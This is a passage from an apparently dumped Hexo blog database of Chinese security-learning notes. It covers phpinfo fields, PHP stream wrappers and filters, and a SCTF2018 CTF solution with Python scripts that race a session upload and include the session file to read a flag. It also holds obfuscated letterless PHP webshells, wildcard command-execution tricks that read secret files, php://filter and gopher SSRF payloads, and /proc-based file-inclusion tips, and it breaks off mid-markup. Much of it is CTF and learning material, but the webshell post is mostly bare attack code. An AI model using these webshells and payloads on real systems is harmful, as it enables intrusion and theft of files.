为例来讲解吧。</p>\n<h2 id=\"版本更迭\"><a href=\"#版本更迭\" class=\"headerlink\" title=\"版本更迭\"></a>版本更迭</h2><p>phpinfo里最显眼的信息，也就是其标题（图1），其中包含PHP的版本信息。 PHP 5.6 是官方最后一个支持的PHP 5版本，不过，这个版本也已经于2017年1月19号停止功能性更新，只提供安全更新。到2018年12月31号为止，PHP 5.6也将完全终止更新，PHP5彻底退出历史舞台。</p>\n<p> PHP7里提供了很多更好用的语法、函数，也极大改进了安全性。举几个简单的例子：</p>\n<ol>\n<li>移除不支持SQL预编译的Mysql扩展：mysql </li>\n<li>移除preg_replace中容易导致代码执行漏洞的正则模式：e </li>\n<li>assert从一个函数变成一个语法结构（类似eval，无法再动态调用。至此，大量PHP一句话木马将失效），7.2中废弃字符串形式的参数 </li>\n<li>hex字符串（如0xf4c3b00c）不再被作为数字，is_numeric也不再认可，可见 <a href=\"https://3v4l.org/ORuc7\" target=\"_blank\" rel=\"noopener\">链接：https://3v4l.org/ORuc7</a> </li>\n<li>7.2中废弃可以动态执行字符串的 create_function </li>\n<li>7.2中废弃容易导致变量覆盖的无第二个参数的parse_str </li>\n<li>移除<code>&lt;script language=&quot;php&quot;\\&gt;</code>和<code>&lt;%</code>，这两种另类的PHP标签 </li>\n<li>移除dl函数</li>\n</ol>\n<p>这里是关于PHP版本支持的一些说明 <a href=\"http://php.net/supported-versions.php\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://php.net/supported-versions.php\" target=\"_blank\" rel=\"noopener\">PHP: Supported Versions</a> PHP5从5.2到5.6，其实也做了很多改进，以前分享过一篇文章 <a href=\"http://www.cnblogs.com/iamstudy/articles/study_from_php_update_log.html\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://www.cnblogs.com/iamstudy/articles/study_from_php_update_log.html\" target=\"_blank\" rel=\"noopener\">php各版本的姿势(2017-02-15更新) - l3m0n - 博客园</a> 大家可以再温故一下，我就不再介绍了。</p>\n<p>和版本有关的一些tricks：</p>\n<ul>\n<li><a href=\"https://tricking.io/card/26/description\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://tricking.io/card/26/description\" target=\"_blank\" rel=\"noopener\">梧桐百科 - 碎片化知识学习</a> - </li>\n<li><a href=\"https://tricking.io/card/24/description\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://tricking.io/card/24/description\" target=\"_blank\" rel=\"noopener\">梧桐百科 - 碎片化知识学习</a> - </li>\n<li><a href=\"https://tricking.io/card/2/description\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://tricking.io/card/2/description\" target=\"_blank\" rel=\"noopener\">梧桐百科 - 碎片化知识学习</a> </li>\n</ul>\n<p>这个两个在线工具可以用来在PHP多版本（包括小版本）中执行代码，进而比较他们之前的区别： </p>\n<ul>\n<li><a href=\"https://3v4l.org/\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://3v4l.org/\" target=\"_blank\" rel=\"noopener\">Online PHP editor | Run code in 200  PHP &amp; HHVM ve…</a> </li>\n<li><a href=\"http://sandbox.onlinephpfunctions.com/\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://sandbox.onlinephpfunctions.com/\" target=\"_blank\" rel=\"noopener\">PHP Sandbox, test PHP online, PHP tester</a></li>\n</ul>\n<h2 id=\"php-ini\"><a href=\"#php-ini\" class=\"headerlink\" title=\"php.ini\"></a>php.ini</h2><p>图1中的四项配置，与php.ini有关。</p>\n<p>图一:</p>\n<p><img src=\"https://file.zsxq.com/148/e0/48e0d690fe8697f0a4129a049f1710a345dc94fd92d01dc4ba174f51ca695580.png\" alt=\"\"></p>\n<p> php.ini是php的配置文件，但其实并不一定每个php环境都会有这个文件。比如我图1中的这个环境，其“Loaded Configuration File”的值是“(none)”，其实就是没有。如果我们没有指定php.ini文件，那么php的所有配置都会使用默认配置。 </p>\n<p>这里有一点值得注意，那就是“默认配置”的含义： </p>\n<ol>\n<li>没有任何php.ini时，某个配置项默认的值 </li>\n<li>用apt等源管理工具安装php后，默认php.ini里配置的值 </li>\n</ol>\n<p>上述两个“默认配置”在大部分情况下是相同的，但还是有些许不同。 举个简单的例子，配置项request_order用来指定PHP的\\$_REQUEST变量以何种顺序取值。《Discuz! 6.x/7.x 全局变量防御绕过导致代码执行》（ <a href=\"https://www.secpulse.com/archives/2338.html\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://www.secpulse.com/archives/2338.html\" target=\"_blank\" rel=\"noopener\">Discuz! 6.x/7.x 全局变量防御绕过导致命令执行 - SecPulse.COM | 安全…</a> ） 就与这个配置有关。 (Discuz那个链接看着有点迷糊，我看的这个<a href=\"http://wooyun.jozxing.cc/static/bugs/wooyun-2014-080723.html\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://wooyun.jozxing.cc/static/bugs/wooyun-2014-080723.html\" target=\"_blank\" rel=\"noopener\">Discuz!某两个版本前台产品命令执行（无需登录） | WooYun-2014-80723 | W…</a>)。</p>\n<p>文中提到，因为PHP5.3以后request_order的默认值变成GP，不再包含\\$_COOKIE，所以导致通过\\$_COOKIE来覆盖变量，造成代码执行。</p>\n<p> 其实文中说的request_order默认值变成GP，指的是第2种情况。也就是说，如果一个完全没有任何php.ini文件的php环境，其默认的request_order，仍然是GPC，而非GP。 我们可以来实验一下，首先用docker启动一个php环境（docker的php环境是没有php.ini的）： </p>\n<blockquote>\n<p>docker run –rm –name php1 -it -p 8080:80 -v <code>pwd</code>:/var/www/html php:7.2-apache </p>\n</blockquote>\n<p>再用docker启动一个默认的debian环境，并用apt源安装php5：</p>\n<blockquote>\n<p>docker run –rm –name php2 -it -p 8081:80 -v <code>pwd</code>:/var/www/html debian:8 bash apt-get update &amp;&amp; apt-get install -y php5 </p>\n<p>php -S 0.0.0.0:80 -t /var/www/html </p>\n</blockquote>\n<p>然后，我们输出一下两个环境的request_order取值，以及\\$_REQUEST变量：图2。 可见，在request_order为空的时候，\\$_REQUEST可以取到$_COOKIE中的值；而request_order=GP的时候，就已经取不到了。我们查看第二个环境的php.ini文件，也可以看到request_order的取值：图3。</p>\n<p> 所以，这两种默认值的含义，需要区分清楚，避免出现错误。</p>\n<p>图二:</p>\n<p><img src=\"https://file.zsxq.com/1d6/59/d659ac1a237468325de98f2cfc0802548d77e8a7ebd9d1a80d0390d2d0b2b7e2.png\" alt=\"\"></p>\n<p>图三:</p>\n<p><img src=\"https://file.zsxq.com/164/c8/64c85402cb752d1d7a5a2fbec6bf434338de9526b3836c08c28cb9382609a720.png\" alt=\"\"></p>\n<p>win10: 本地win10+phpstudy+apache中5.3.29-nts与5.4.45-nts中的requests_order方式是”CGP”</p>\n<p>除了默认php配置，还有两个配置项我没说。在编译PHP的时候，我们可以指定–with-config-file-path和–with-config-file-scan-dir。`</p>\n<p> 这两个配置项的意思是，PHP会在–with-config-file-path指定的目录下寻找php.ini文件，如果找到则加载之；除此之外，PHP还会在–with-config-file-scan-dir指定的目录下，寻找所有以.ini为后缀的文件，加载其为配置文件，这个配置是可以覆盖php.ini中配置的。 所以，通常用apt-get install php-pdo来安装php扩展，都会在–with-config-file-scan-dir下写入新的配置文件，而不是修改php.ini。 </p>\n<p>这样，我们如果遇到phpinfo页面，即可用过这两个配置项，来定位php.ini以及额外配置文件的位置。甚至来说，如果这两个目录可写，我们就能写入自己的php配置，进而达成跨站、提权等目的。</p>\n<p>图四:</p>\n<p><img src=\"https://file.zsxq.com/148/e0/48e0d690fe8697f0a4129a049f1710a345dc94fd92d01dc4ba174f51ca695580.png\" alt=\"\"></p>\n<h2 id=\"SAPI\"><a href=\"#SAPI\" class=\"headerlink\" title=\"SAPI\"></a>SAPI</h2><p>见图5，Server API 指的是当前PHP运行在哪一种模式下。SAPI是PHP内核的一个概念，相当于是PHP核心解释器和应用层（如Web中间件）的一个桥梁。我们需要在SAPI里实现一些函数，供PHP底层调用。 </p>\n<p>这篇文章（ <a href=\"https://foio.github.io/php-sapi/\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://foio.github.io/php-sapi/\" target=\"_blank\" rel=\"noopener\">理解php内核中SAPI的作用 – 积木村の研究所</a> ）里举了个简单的例子：cli和cgi这两个SAPI，均需要实现sapi_cgi_read_cookies函数，但cli模式下没有cookie，所以该函数返回null；cgi模式下，cookie从HTTP头中获取，所以返回的是getenv(“HTTP_COOKIE”)。 </p>\n<p>下面介绍一些常用的SAPI。 图5中的FPM/FastCGI指的就是一种SAPI，其提供了一种以fastcgi协议和Web中间件（如Nginx）通信的接口，具体流程可以阅读我的这篇文章（ <a href=\"https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html\" target=\"_blank\" rel=\"noopener\">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写 | 离别歌</a>  ）。</p>\n<p>图5:</p>\n<p><img src=\"https://file.zsxq.com/1a0/72/a072352975fb3a7f091f12f1f51c359d246c1ea1dded3a33be4300fc81d143c8.png\" alt=\"\"></p>\n<p> PHP为Apache提供了一个专用了SAPI——Apache 2.0 Handler。相当于是把PHP编译成一个动态链接库，作为Apache的一个模块。</p>\n<p> 当然，Apache也不一定必须用这种SAPI，他同样也支持用Fastcgi和PHP-FPM通信。所以，即使你在实战中遇到了服务器是Apache的环境，也不能就此认定其一定存在Apache模块。你可以尝试下载一个PHPStudy，来看看是否有apache_get_version函数，答案是否定的。 我们平时在命令行里运行PHP，比如php -i （在命令行下执行phpinfo的方法），你可以看到此时的Server API是“Command Line Interface”：图6。</p>\n<p>图6:</p>\n<p><img src=\"https://file.zsxq.com/1b6/61/b661242ec92dae5334dd695b75c7a3ad2f8a028c8cbc59151eec9230cc7d9a45.png\" alt=\"\"></p>\n<p>这个SAPI就是给命令行用的。 </p>\n<p>另外，PHP5.4及以后，我们可以用 php -S localhost:8080 来启动PHP内置的Web server。这个Web server其实也是一个SAPI，名为“Built-in HTTP server”：图7。 </p>\n<p>图7:</p>\n<p><img src=\"https://file.zsxq.com/1b2/bb/b2bbf2fcb9f5d5088f55dc290570ba84f8c0cc86af9786bbaa5b02b77372fdb8.png\" alt=\"PHP\"> </p>\n<p>Built-in Server相当于实现了一个Web文件服务器，然后将PHP有关的请求发给“Built-in HTTP server”这个SAPI，最终交给解释器解析。 </p>\n<p>在很古老的时候，rfc3875（ <a href=\"http://www.ietf.org/rfc/rfc3875\" target=\"_blank\" rel=\"noopener\">链接：http://www.ietf.org/rfc/rfc3875</a> ）定义了一种运行Web应用的方法——CGI，PHP也为其提供了名为“CGI/FastCGI”的SAPI，不过用的比较少，不介绍了。 </p>\n<p>除此之外，还有一个比较有意思的SAPI，叫embed，这是一个嵌入式SAPI。这个功能就很有意思了，我们能很容易地将PHP解释器集成到自己的程序里。比如Laruence在08年曾写过一篇《使用PHP Embed SAPI实现Opcodes查看器》的文章：<a href=\"http://www.laruence.com/2008/09/23/539.html\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://www.laruence.com/2008/09/23/539.html\" target=\"_blank\" rel=\"noopener\">使用PHP Embed SAPI实现Opcodes查看器 | 风雪之隅</a> 。 </p>\n<p>原理也比较简单，就是在外部调用PHP内核的zend_compile_file函数，将代码转换成OPCODE，然后输出。</p>\n<p> uwsgi的PHP插件，也是利用内嵌embed的PHP，我们可以在 <a href=\"https://github.com/vulhub/vulhub/blob/master/base/uwsgi/php/2.0.16/Dockerfile\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://github.com/vulhub/vulhub/blob/master/base/uwsgi/php/2.0.16/Dockerfile\" target=\"_blank\" rel=\"noopener\">vulhub/Dockerfile at master · vulhub/vulhub · GitH…</a> 看到整个编译的过程。 </p>\n<p>phpdbg是php5.4及以后加入的一个php交互式调试器，他也是一个sapi。</p>\n<h2 id=\"php支持的协议\"><a href=\"#php支持的协议\" class=\"headerlink\" title=\"php支持的协议\"></a>php支持的协议</h2><p>图8，Registered PHP Streams中列出了PHP默认支持的一些协议。 我们来一一介绍一下。 </p>\n<p>https和http自然不用说，用来包装http协议，我们可以执行readfile(‘<a href=\"http://www.example.com/\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://www.example.com/\" target=\"_blank\" rel=\"noopener\">Example Domain</a>‘);来发送一个http请求。 </p>\n<p>ftps和ftp，用来包装ftp协议，和http类似。 </p>\n<p>compress.zlib用来处理zlib压缩过的数据，比如我们可以用readfile(‘compress.zlib://file.gz’);来读取用zlib压缩过的文件。 </p>\n<p>php是php特有的协议，用其可以访问输入输出流，并进行过滤、编码等操作。其支持的功能有很多，可以参考这个文档：<a href=\"http://php.net/manual/zh/wrappers.php.php\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://php.net/manual/zh/wrappers.php.php\" target=\"_blank\" rel=\"noopener\">PHP: php:// - Manual</a> </p>\n<p>file用来访问本地文件，比如readfile(‘file:///etc/passwd’);</p>\n<p> glob用来以模式匹配的方式访问本地目录，比如 dir(‘glob:///etc/*’)。 </p>\n<p>data可以用url的方式来模拟一个输入流（RFC 2397），比如，readfile通常是用来读取文件中的内容，但我们可以通过 readfile(‘data://text/plain;base64,SGVsbG8=’); 来解码base64串，并将其作为输入流读取。 </p>\n<p>phar是用来读写PHP归档，PHP归档类似于Java的.jar文件，我们可以将一个完整的PHP项目（可能包含数百个文件）打包成一个.phar，比如composer.phar。phar流就负责读写这个文件。</p>\n<p> 除此之外，常见的协议还有zip://，用来读写zip格式的压缩文件；</p>\n<p>compress.bzip2://用来读写bz2压缩的文件。这些协议可能需要额外安装扩展。</p>\n<p>另外，用户也可以定义自己的流，即实现streamWrapper类中的方法，这块我就不介绍了。</p>\n<p>图8:</p>\n<p><img src=\"https://file.zsxq.com/179/b6/79b6f16973ae9a0c370e62e0f7fa11f401121107e39d1ac9bc0e6a486ba8075d.png\" alt=\"\"></p>\n<h2 id=\"Registered-Stream-Filters\"><a href=\"#Registered-Stream-Filters\" class=\"headerlink\" title=\"Registered Stream Filters\"></a>Registered Stream Filters</h2><p>Registered Stream Filters列出了一些默认支持的filter流。（图9） 其实PHP中的filter流，是和协议密不可分的。协议的作用是读写文件（包括正常文件、目录、输入输出等），而filter流的作用就是在读写的中途对数据进行过滤和编码，相当于是一个HOOK。 </p>\n<p>zlib.*用来压缩和解压数据，和compress.zlib://协议不同的是，用zlib流可以压缩、解压任何其他协议里传输的数据。 </p>\n<p>convert.iconv.*用来转换编码。 </p>\n<p>string.*用来做字符串转换，比如string.strip_tags用来去除字符串中的标签，string.tolower用来将字符串转换成小写。 </p>\n<p>convert.*用来转换数据，比如用convert.base64-decode可以做base64的解码。其实我觉得放在string.*里也可以。 </p>\n<p>dechunk用来处理chunk相关的数据，chunk是HTTP1.1中传输流式数据的方式（ <a href=\"https://en.wikipedia.org/wiki/Chunked_transfer_encoding\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://en.wikipedia.org/wiki/Chunked_transfer_encoding\" target=\"_blank\" rel=\"noopener\">Chunked transfer encoding - Wikipedia</a> ），用这个filter流就能将chunk解开。 consumed应该是用来计算数据字符数量的。</p>\n<p> 在PHP里，我们可以用stream_filter_append函数将上述流，附加在某个输入输出资源上。当然，更常见的用法是，我们可以用php://filter协议来使用上述流，比如 readfile(‘php://filter/read=convert.base64-encode/resource=/etc/passwd’); 关于php://filter的一些有趣的技巧，可以阅读这篇文章 <a href=\"https://www.leavesongs.com/PENETRATION/php-filter-magic.html\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://www.leavesongs.com/PENETRATION/php-filter-magic.html\" target=\"_blank\" rel=\"noopener\">谈一谈php://filter的妙用 | 离别歌</a>  。</p>\n<p>图9:</p>\n<p><img src=\"https://file.zsxq.com/142/62/426224a833018047b952319a5e72bea0f85227707d522c748fa533acf12f6b17.png\" alt=\"\"></p>\n<h2 id=\"session-uplaod\"><a href=\"#session-uplaod\" class=\"headerlink\" title=\"session uplaod\"></a>session uplaod</h2><p>图10:</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20180622171313-7ddab932-75fc-1.png\" alt=\"\"></p>\n<p><code>session.upload_progress.enabled = on</code> 说明可以覆盖session</p>\n<p><code>clean up</code>说明需要竞争</p>\n<p>图11：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20180622171313-7dcda382-75fc-1.png\" alt=\"\"></p>\n<p>sessionupload.py</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!coding:utf-8</span><br><span class=\"line\">import requests</span><br><span class=\"line\">import time</span><br><span class=\"line\"></span><br><span class=\"line\">url = &apos;http://116.62.71.206:52872/?f=login.php&apos;</span><br><span class=\"line\">data = &#123;&apos;name&apos;:&apos;admin&apos;,&apos;pass&apos;:&apos;sctf2018_h656cDBkU2&apos;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">r = requests.post(url,data = data)</span><br><span class=\"line\">PHPSESSID = r.cookies[&apos;PHPSESSID&apos;]</span><br><span class=\"line\">print &apos;input the PHPSESSID in include.py&apos; +&apos;\\n&apos; + PHPSESSID</span><br><span class=\"line\">time.sleep(10)</span><br><span class=\"line\"></span><br><span class=\"line\">while 1:</span><br><span class=\"line\">    url = &apos;http://116.62.71.206:52872/?f=upload_sctf2018_C9f7y48M75.php&apos;</span><br><span class=\"line\">    files = &#123; </span><br><span class=\"line\">    &quot;PHP_SESSION_UPLOAD_PROGRESS&quot; : (None,&apos;&lt;?php echo file_get_contents(&quot;/tmp/flag_56CcE97QGNxDEXNpW3HY&quot;);?&gt;&apos;),  </span><br><span class=\"line\"></span><br><span class=\"line\">    &quot;upload&quot; : (&quot;tmp.jpg&quot;, open(&quot;tmp.png&quot;, &quot;rb&quot;), &quot;image/png&quot;), </span><br><span class=\"line\"></span><br><span class=\"line\">    &quot;submit&quot; : (None,&quot;submit&quot;)</span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">    #proxies = &#123;&apos;http&apos;:&apos;http://127.0.0.1:8080&apos;&#125;</span><br><span class=\"line\">    headers = &#123;&apos;Cookie&apos;:&apos;PHPSESSID=&apos; + PHPSESSID&#125;</span><br><span class=\"line\">    r = requests.post(url,files = files , headers = headers)</span><br><span class=\"line\">    print r.text</span><br><span class=\"line\">    print PHPSESSID</span><br><span class=\"line\">    #开了cleanup，需要竞争，并且保持回话的session</span><br></pre></td></tr></table></figure>\n<p>include.py</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!coding:utf-8</span><br><span class=\"line\"></span><br><span class=\"line\">import requests</span><br><span class=\"line\">PHPSESSID = &apos;qc2kavokdjiiepu283hduivod2&apos;</span><br><span class=\"line\">while 1:</span><br><span class=\"line\">    url = &apos;http://116.62.71.206:52872/?f=aa://../../../../var/lib/php/sessions/sess_&apos; + PHPSESSID</span><br><span class=\"line\">    print url</span><br><span class=\"line\">    r = requests.get(url)</span><br><span class=\"line\">    if &apos;SCTF&apos; in r.text:</span><br><span class=\"line\">        print r.text</span><br><span class=\"line\">        break</span><br></pre></td></tr></table></figure>\n<h2 id=\"案例\"><a href=\"#案例\" class=\"headerlink\" title=\"案例\"></a>案例</h2><p>以前我在博客里讲过不少和协议有关的安全tricks，大家也分享过一些，今天来温故一下。 </p>\n<p>利用php filter绕过死亡exit：<a href=\"https://www.leavesongs.com/PENETRATION/php-filter-magic.html\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://www.leavesongs.com/PENETRATION/php-filter-magic.html\" target=\"_blank\" rel=\"noopener\">谈一谈php://filter的妙用 | 离别歌</a> </p>\n<p>利用phar/zip协议绕过有后缀的文件包含：include zip:///var/www/html/upload/1.gif#1.php </p>\n<p>利用curl+gopher协议进行SSRF漏洞利用： <a href=\"http://blog.neargle.com/SecNewsBak/drops/Do%20Evil%20Things%20with%20gopher%20.html\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://blog.neargle.com/SecNewsBak/drops/Do%20Evil%20Things%20with%20gopher%20.html\" target=\"_blank\" rel=\"noopener\">Do Evil Things with gopher://</a> </p>\n<p>SSRF检查host时进行文件读取：file://localhost/etc/passwd </p>\n<p>利用php协议+zlib.inflate流压缩数据，突破libxml解析器限制的实体长度 </p>\n<p>php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd</p>"},{"title":"php-命令执行","date":"2018-07-18T07:58:22.000Z","passwd":345678,"_content":"\n1. webshell\n\n```shell\n<?=$_=\"`{{{\"^\"?<>/\";${$_}[_](${$_}[__]);\n=> \n$_GET[_]($_GET[__]);\n=>\n<?=`{${~\"����\"}[_]}`;\n// echo -ne '<?=`{${~\"\\xa0\\xb8\\xba\\xab\"}[_]}`;'\n```\n\n2. 写文件&读文件\n\nphp的标签<?php存在字母肯定不行，尝试<?发现不解析，没有开启段标签。\n查资料后发现<?=可以作为php标签。<?=的含义为<?php echo，是PHP 5.4.0以后的新特性\n**不管是否设置 short_open_tag php.ini 选项，<?= 将总是可用。**\n\n```shell\n<?=$_=`/???/??? ../??????.???>@#$`;\n=> \n/bin/cat ../secret.php>@#$\n=> \ncat ../secret.php>@#$\n=>\n<?=`/???/??? ../??????.??? > ===`\n=>\n<?=`/???/??? ../*`;\n```\n\n","source":"_posts/php-webshell.md","raw":"---\ntitle: php-命令执行\ndate: 2018-07-18 15:58:22\ntags:\npasswd: 345678\n---\n\n1. webshell\n\n```shell\n<?=$_=\"`{{{\"^\"?<>/\";${$_}[_](${$_}[__]);\n=> \n$_GET[_]($_GET[__]);\n=>\n<?=`{${~\"����\"}[_]}`;\n// echo -ne '<?=`{${~\"\\xa0\\xb8\\xba\\xab\"}[_]}`;'\n```\n\n2. 写文件&读文件\n\nphp的标签<?php存在字母肯定不行，尝试<?发现不解析，没有开启段标签。\n查资料后发现<?=可以作为php标签。<?=的含义为<?php echo，是PHP 5.4.0以后的新特性\n**不管是否设置 short_open_tag php.ini 选项，<?= 将总是可用。**\n\n```shell\n<?=$_=`/???/??? ../??????.???>@#$`;\n=> \n/bin/cat ../secret.php>@#$\n=> \ncat ../secret.php>@#$\n=>\n<?=`/???/??? ../??????.??? > ===`\n=>\n<?=`/???/??? ../*`;\n```\n\n","slug":"php-webshell","published":1,"updated":"2018-07-20T13:44:54.724Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12hq000zqkdlrtexhh8r","content":"<ol>\n<li>webshell</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?=$_=\"`&#123;&#123;&#123;\"^\"?&lt;&gt;/\";$&#123;$_&#125;[_]($&#123;$_&#125;[__]);</span><br><span class=\"line\">=&gt; </span><br><span class=\"line\"><span class=\"meta\">$</span>_GET[_]($_GET[__]);</span><br><span class=\"line\">=&gt;</span><br><span class=\"line\">&lt;?=`&#123;$&#123;~\"����\"&#125;[_]&#125;`;</span><br><span class=\"line\">// echo -ne '&lt;?=`&#123;$&#123;~\"\\xa0\\xb8\\xba\\xab\"&#125;[_]&#125;`;'</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>写文件&amp;读文件</li>\n</ol>\n<p>php的标签&lt;?php存在字母肯定不行，尝试&lt;?发现不解析，没有开启段标签。<br>查资料后发现&lt;?=可以作为php标签。&lt;?=的含义为&lt;?php echo，是PHP 5.4.0以后的新特性<br><strong>不管是否设置 short_open_tag php.ini 选项，&lt;?= 将总是可用。</strong></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?=$_=`/???/??? ../??????.???&gt;@#$`;</span><br><span class=\"line\">=&gt; </span><br><span class=\"line\">/bin/cat ../secret.php&gt;@#$</span><br><span class=\"line\">=&gt; </span><br><span class=\"line\">cat ../secret.php&gt;@#$</span><br><span class=\"line\">=&gt;</span><br><span class=\"line\">&lt;?=`/???/??? ../??????.??? &gt; ===`</span><br><span class=\"line\">=&gt;</span><br><span class=\"line\">&lt;?=`/???/??? ../*`;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<ol>\n<li>webshell</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?=$_=\"`&#123;&#123;&#123;\"^\"?&lt;&gt;/\";$&#123;$_&#125;[_]($&#123;$_&#125;[__]);</span><br><span class=\"line\">=&gt; </span><br><span class=\"line\"><span class=\"meta\">$</span>_GET[_]($_GET[__]);</span><br><span class=\"line\">=&gt;</span><br><span class=\"line\">&lt;?=`&#123;$&#123;~\"����\"&#125;[_]&#125;`;</span><br><span class=\"line\">// echo -ne '&lt;?=`&#123;$&#123;~\"\\xa0\\xb8\\xba\\xab\"&#125;[_]&#125;`;'</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>写文件&amp;读文件</li>\n</ol>\n<p>php的标签&lt;?php存在字母肯定不行，尝试&lt;?发现不解析，没有开启段标签。<br>查资料后发现&lt;?=可以作为php标签。&lt;?=的含义为&lt;?php echo，是PHP 5.4.0以后的新特性<br><strong>不管是否设置 short_open_tag php.ini 选项，&lt;?= 将总是可用。</strong></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?=$_=`/???/??? ../??????.???&gt;@#$`;</span><br><span class=\"line\">=&gt; </span><br><span class=\"line\">/bin/cat ../secret.php&gt;@#$</span><br><span class=\"line\">=&gt; </span><br><span class=\"line\">cat ../secret.php&gt;@#$</span><br><span class=\"line\">=&gt;</span><br><span class=\"line\">&lt;?=`/???/??? ../??????.??? &gt; ===`</span><br><span class=\"line\">=&gt;</span><br><span class=\"line\">&lt;?=`/???/??? ../*`;</span><br></pre></td></tr></table></figure>\n"},{"title":"proc的作用","date":"2018-06-24T02:55:47.000Z","_content":"\n# proc目录的作用\n\n1. /proc/self/environ              读取环境变量\n\n   该文件会保存http请求头，所以发送恶意User-aget,可以通过文件包含，包含该文件getshell\n\n2. /proc/net/arp                     读取arp\n\n   判断当前局域网存活的主机\n\n3. /proc/self[pid]/cmdline              获得当前运行程序命令行参数\n\n","source":"_posts/proc的作用.md","raw":"---\ntitle: proc的作用\ndate: 2018-06-24 10:55:47\ntags:\n---\n\n# proc目录的作用\n\n1. /proc/self/environ              读取环境变量\n\n   该文件会保存http请求头，所以发送恶意User-aget,可以通过文件包含，包含该文件getshell\n\n2. /proc/net/arp                     读取arp\n\n   判断当前局域网存活的主机\n\n3. /proc/self[pid]/cmdline              获得当前运行程序命令行参数\n\n","slug":"proc的作用","published":1,"updated":"2018-06-24T02:57:47.372Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12ht0012qkdlwmjq3y0l","content":"<h1 id=\"proc目录的作用\"><a href=\"#proc目录的作用\" class=\"headerlink\" title=\"proc目录的作用\"></a>proc目录的作用</h1><ol>\n<li><p>/proc/self/environ              读取环境变量</p>\n<p>该文件会保存http请求头，所以发送恶意User-aget,可以通过文件包含，包含该文件getshell</p>\n</li>\n<li><p>/proc/net/arp                     读取arp</p>\n<p>判断当前局域网存活的主机</p>\n</li>\n<li><p>/proc/self[pid]/cmdline              获得当前运行程序命令行参数</p>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"proc目录的作用\"><a href=\"#proc目录的作用\" class=\"headerlink\" title=\"proc目录的作用\"></a>proc目录的作用</h1><ol>\n<li><p>/proc/self/environ              